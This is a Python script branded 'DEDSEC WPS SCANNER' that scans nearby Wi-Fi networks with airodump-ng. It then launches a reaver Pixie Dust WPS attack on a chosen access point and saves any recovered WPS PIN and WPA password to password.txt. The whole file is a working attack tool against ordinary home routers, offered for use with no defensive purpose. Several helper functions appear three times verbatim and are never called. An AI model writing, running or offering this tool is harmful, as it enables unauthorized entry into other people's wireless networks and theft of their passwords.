import subprocess
import time
from scapy.all import ARP, Ether, srp
import psutil
from tabulate import tabulate
import os, sys
from subprocess import Popen
import csv
import threading
from termcolor import colored

banner_text = '''
                     .:=+*#%@@@@@@@%%#*+-:                  
                 :=#@@@@@@@@@@@@@@@@@@@@@@@%+-              
              -*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=.          
           .+@@@@@@@@@@@#*+--::::::-=+*%@@@@@@@@@@#-        
         .*@@@@@@@@%+-.                  :=#@@@@@@@@%=      
        *@@@@@@@%+.          .....           -#@@@@@@@%.    
       +@@@@@@%-       .-+#@@@@@@@@@%#+-.      .*@@@@@@:    
        *@@@#-      .+%@@@@@@@@@@@@@@@@@@%=.     .+##+:     
                  :#@@@@@@@@@@@@@@@@@@@@@@@@*:              
                .#@@@@@@@@@%*=----=*%@@@@@@@@@*             
                %@@@@@@@#-            -#@@@@@@@.            
                =@@@@@#:                :#@@@@=             
                 .-=-.      .-=+=-.        ..               
                          .*@@@@@@@*.                       
                          %@@@@@@@@@%                       
                          @@@@@@@@@@@                       
                          =@@@@@@@@@=                       
                           :*%@@@%+.                        
'''

home = os.getcwd()
scanned_path = home+'/.info'
DN = open(os.devnull, 'w')
commands = []

if not os.path.exists(scanned_path):
    os.makedirs(scanned_path)

os.chdir(scanned_path)

def verificar_e_instalar_dependencias():
    try:
        import pywifi
        from scapy.all import ARP, Ether, srp
    except ImportError:
        print("As dependências 'pywifi' e 'scapy' não estão instaladas.")
        instalar_dependencias()

def instalar_dependencias():
    try:
        subprocess.run(["pkg", "install", "python"], check=True)
        subprocess.run(["pkg", "install", "clang"], check=True)
        subprocess.run(["pkg", "install", "libxml2", "libxml2-dev", "libxslt", "libxslt-dev"], check=True)
        subprocess.run(["pip", "install", "pywifi", "scapy"], check=True)
        print("As dependências 'pywifi' e 'scapy' foram instaladas com sucesso.")
    except subprocess.CalledProcessError:
        print("Erro ao instalar as dependências 'pywifi' e 'scapy'. Certifique-se de que o Termux está corretamente configurado e tente novamente.")

from scapy.all import ARP, Ether, srp

def obter_dispositivos_conectados():
    arp = ARP(pdst="192.168.0.1/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pacote = ether/arp

    resultado = srp(pacote, timeout=3, verbose=0)[0]

    dispositivos = []

    for sent, received in resultado:
        dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return dispositivos

def calcular_senha(bssid):
    bssid = bssid.replace(":", "")
    bssid = bssid[2:]
    return bssid

from scapy.all import ARP, Ether, srp

def obter_dispositivos_conectados():
    arp = ARP(pdst="192.168.0.1/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pacote = ether/arp

    resultado = srp(pacote, timeout=3, verbose=0)[0]

    dispositivos = []

    for sent, received in resultado:
        dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return dispositivos

def calcular_senha(bssid):
    bssid = bssid.replace(":", "")
    bssid = bssid[2:]
    return bssid

from scapy.all import ARP, Ether, srp

def obter_dispositivos_conectados():
    arp = ARP(pdst="192.168.0.1/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pacote = ether/arp

    resultado = srp(pacote, timeout=3, verbose=0)[0]

    dispositivos = []

    for sent, received in resultado:
        dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return dispositivos

def calcular_senha(bssid):
    bssid = bssid.replace(":", "")
    bssid = bssid[2:]
    return bssid

def mon_man_mode(wname, mode):
    os.system(f'ifconfig {wname} down')
    os.system(f'iwconfig {wname} mode {mode}')
    os.system(f'ifconfig {wname} up')

def show_wifi():
    os.system('clear')
    print(banner_text)
    format = []
    header = [colored('WIFI ADAPTER NAME', 'cyan')]
    format.append(header)
    d = 0
    for element in inter:
        d += 1
        wifi_name = str(element)
        format.append([f'{d}. ' + wifi_name])
    print(tabulate(format, tablefmt='fancy_grid'))
    
    try:
        select = int(input('NO: '))
        if select == select:
            global wname
            wname = inter_dict[select]
        else:
            pass
    except KeyError:
        os.system('clear')
        show_wifi()

def scanAP(wname):
    cmd = ['airodump-ng',wname,'-w','scanned','--output-format','csv']
    for i in os.listdir(scanned_path):
        if 'scanned' in i:
            os.remove(i)
    proc_read = Popen(cmd, stdout=DN, stderr=DN)

    while os.path.exists(scanned_path+"/scanned-01.csv") == False:
        continue
    
    attempts_count = 0
    while True:
        try:
            os.system('clear')
            with open(scanned_path+'/scanned-01.csv') as csv_file:
                csv_reader = csv.reader(csv_file, delimiter=',')
                hit_clients = False
                ssid = None
                output_clients = ""
                bssid_list = []
                ssid_list = []
                channel_list = []
                count = -1

                if output_clients == "":
                    attempts_count += 1
                    print(tabulate([[colored('STARTING SCANNING WIFI', 'cyan')]], tablefmt='fancy_grid'))
                    if attempts_count/2 > 15:
                        print(tabulate([[colored('Scanning time exceeded 15sec.', 'cyan')]], tablefmt='fancy_grid'))

                for row in csv_reader:
                    if len(row) < 2:
                        continue
                    if not hit_clients:
                        if row[0].strip() == 'Station MAC':
                            hit_clients = True
                            continue
                        if len(row) < 14:
                            continue
                        if row[0].strip() == 'BSSID':
                            continue
                        enc = row[5].strip()
                        if len(enc) > 4:
                            enc = enc[4:].strip()

                        bssid = row[0].strip()
                        power = str(row[8].strip())
                        channel = str(row[3].strip())
                        ssid = row[13].strip()
                        ssidlen = int(row[12].strip())
                        ssid = ssid[:ssidlen]
                        count += 1
                        if len(ssid) <= 20:
                            output_clients += f"   [{count}] {ssid.ljust(20)} {channel.rjust(3)}  {enc.ljust(4)} {power.rjust(4)}    {bssid.ljust(10)}\n"
                        else:
                            output_clients += f"   [{count}] {ssid[0:17]}... {channel.rjust(3)}  {enc.ljust(4)} {power.rjust(4)}    {bssid.ljust(10)}\n"
                        
                        bssid_list.append(bssid)
                        ssid_list.append(ssid)
                        channel_list.append(channel)

                    else:
                        if len(row) < 6:
                            continue
                if output_clients != "":
                    os.system('clear')
                    print(tabulate([['Press CTRL+C when the target WIFI appears \n', colored('DEDSEC WPS SCANNER', 'cyan')]], tablefmt='fancy_grid'))
                    print(f'   ___ ____________________  __  ____  _____  _________________')
                    print(f"  |NUM SSID                  CH  ENCR  POWER  BSSID            |")
                    print(f'   ___ ____________________  __  ____  _____  _________________')
                    print(output_clients)
                    print(f'   ___ ____________________  __  ____  _____  _________________')
                csv_file.close()
            time.sleep(0.5)

        except KeyboardInterrupt:
            if ssid is None:
                os.system('clear')
                print(tabulate([[colored("Couldn't catch any WIFI", 'cyan')]], tablefmt='fancy_grid'))
                time.sleep(2)
            else:
                selectAP(proc_read, output_clients, bssid_list, ssid_list, channel_list)
            break

def selectAP(proc_read, output_clients, bssid_list, ssid_list, channel_list):
    proc_read.kill()
    os.system('stty sane')
    os.system('clear')
    while True:
        try:
            print(banner_text)
            print(f'   ___ ____________________  __  ____  _____  _________________')
            print(f"  |NUM SSID                  CH  ENCR  POWER  BSSID            |")
            print(f'   ___ ____________________  __  ____  _____  _________________')
            print(output_clients)
            print(f'   ___ ____________________  __  ____  _____  _________________')
            global target_ssid
            global target_bssid
            target_id = input(f"   NO: ")
            target_id = int(target_id)
            target_bssid = bssid_list[target_id]
            target_ssid = ssid_list[target_id]
            target_channel = channel_list[target_id]
            os.system('clear')
            t = threading.Thread(target=attack(target_bssid, target_ssid, target_channel, wname))
            t.start()
            break
        except KeyboardInterrupt:
            break

def attack(target_bssid, target_ssid, target_channel, wname):
    try:
        os.system('clear')
        print()
        print(tabulate([[colored(f'Starting wps attack for {target_ssid} ({target_bssid}) on channel {target_channel}', 'cyan')]],tablefmt='fancy_grid'))
        print(f' Press CTRL+C to STOP')
        print(f'\n      [-] START CRACKING: {target_ssid} - {target_bssid} - {target_channel}  ')
        command = ['reaver', '-i', f'{wname}', '-b', f'{target_bssid}', '-c', f'{target_channel}', '-K', '1', '-N', '-vvv']
        with open('log.txt', 'w') as f:
            process = subprocess.Popen(command, stdout=f, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, universal_newlines=True)
            process.communicate(input='n\n')[0]
        password_show()
    except KeyboardInterrupt:
        mon_man_mode(wname, 'managed')
        os.system('service networking restart')
        os.remove(f'{scanned_path}/log.txt')
        os.remove(f'{scanned_path}/scanned-01.csv')
        menu()

def password_show():
    os.system('clear')
    print(banner_text)
    with open(f'{scanned_path}/log.txt', 'r') as f:
        wps_pin = None
        wpa_psk = None
        ap_ssid = None
        for line in f:
            if '[+] WPS PIN:' in line:
                wps_pin = line.split("'")[1]
            elif '[+] WPA PSK:' in line:
                wpa_psk = line.split("'")[1]
            elif '[+] AP SSID:' in line:
                ap_ssid = line.split("'")[1]

    if wps_pin is None or wpa_psk is None or ap_ssid is None:
        data = [['PIN:', colored('NOT FOUND', 'red')],
                ['PASSWORD:', colored('NOT FOUND', 'red')]]
        print(tabulate([['WIFI PASSWORD NOT FOUND', 'MAKE CLOSER TO THE TARGET WIFI AND TRY AGAIN']], tablefmt='fancy_grid'))
        print(tabulate([['TARGET SSID:', colored(f'{target_ssid}', 'cyan')],['TARGET BSSID:', colored(f'{target_bssid}', 'cyan')]], tablefmt='fancy_grid'))
        print(tabulate(data, tablefmt='fancy_grid'))
        input(colored(f'\n                          PRESS ENTER TO CONTINUE\n\n', 'cyan'))
        os.remove(f'{scanned_path}/log.txt')
        os.remove(f'{scanned_path}/scanned-01.csv')
        menu()

    else:
        with open(f'{home}/password.txt', 'a') as f:
            f.write(f"WIFI NAME: {ap_ssid} WPS PIN: {wps_pin} PASSWORD: {wpa_psk}\n")

        data = [['PIN', colored(f'{wps_pin}', 'cyan')],
                ['PASSWORD', colored(f'{wpa_psk}', 'cyan')]]
        os.system('clear')
        print(tabulate([['WIFI PASSWORD FOUND', 'WIFI INFO SAVED AS: password.txt']], tablefmt='fancy_grid'))
        print(tabulate([['TARGET SSID:', colored(f'{target_ssid}', 'cyan')],['TARGET BSSID:', colored(f'{target_bssid}', 'cyan')]], tablefmt='fancy_grid'))
        print(tabulate(data, tablefmt='fancy_grid'))
        input(colored(f'\n                          PRESS ENTER TO CONTINUE\n\n', 'cyan'))
        os.remove(f'{scanned_path}/log.txt')
        os.remove(f'{scanned_path}/scanned-01.csv')
        menu()

addrs = psutil.net_if_addrs()
inter = list(addrs.keys())

inter_dict = {}
for i, interface in enumerate(inter, start=1):
    inter_dict[i] = interface

def check_root():
    os.system('clear')
    if not os.geteuid()==0:
        sys.exit('\nThis script must be run as root!\n')
    else:
        menu()

def menu():
    os.system('clear')
    print(banner_text)
    print(tabulate([['1. START'], ['2. ' + colored('EXIT', 'red')]],tablefmt='fancy_grid'))
    try:
        select = int(input('root@dedsec: '))
        if select == 1:
            show_wifi()
            scanAP(wname)
        elif select == 2:
            mon_man_mode(wname, 'managed')
            os.system('service networking restart')
            os.system('clear')
            sys.exit('BYE BYE')
    except KeyboardInterrupt:
        mon_man_mode(wname, 'managed')
        os.system('service networking restart')
        os.system('clear')
        sys.exit(colored('BYE BYE', 'red'))

check_root()
